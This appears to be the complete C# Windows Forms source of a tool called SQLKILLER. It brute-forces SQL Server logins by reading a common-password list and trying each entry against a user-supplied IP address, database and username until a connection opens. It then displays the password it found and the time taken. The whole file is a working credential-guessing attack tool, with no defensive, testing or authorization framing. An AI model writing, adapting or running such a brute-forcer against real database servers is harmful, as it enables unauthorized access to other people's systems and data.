using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SqlClient;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;

namespace SQLKILLER
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void label6_Click(object sender, EventArgs e)
        {

        }
        private void button1_Click(object sender, EventArgs e)
        {
            int sayac = 0;
            DateTime startedTime = DateTime.Now;
            int count = File.ReadAllLines(Application.StartupPath + "MostUsedPasswords.txt").Length;
            StreamReader streamReader = new StreamReader(Application.StartupPath + "MostUsedPasswords.txt");
            for (int i = 0; i < count; i++)
            {
                if (i % 100 == 0)
                {
                    listBox1.Items.Clear();
                    this.Update();
                }
                string pwd = streamReader.ReadLine();
                progressBar1.Value += 5;
                listBox1.Items.Add(pwd);
                this.Update();
                sayac++;
                if (sayac == 20)
                {
                    sayac = 0;
                    progressBar1.Value = 0;
                }
                try
                {
                    string conn = "DATA SOURCE=" + tbxIp.Text.ToString() + ";INITIAL CATALOG=" + tbxDB.Text.ToString() + ";UID=" + tbxUser.Text.ToString() + ";PASSWORD=" + pwd.ToString() + ";CONNECT TIMEOUT=1";
                    SqlConnection connection = new SqlConnection(conn);
                    connection.Open();
                    if (connection.State == ConnectionState.Open)
                    {
                        progressBar1.Value = 100;
                        lblPassword.Text = pwd;
                        TimeSpan ts = DateTime.Now - startedTime;
                        lblTime.Text = ts.ToString(@"hh\:mm\:ss");
                        return;
                    }
                }
                catch (Exception)
                {
                }


            }
        }
    }
}
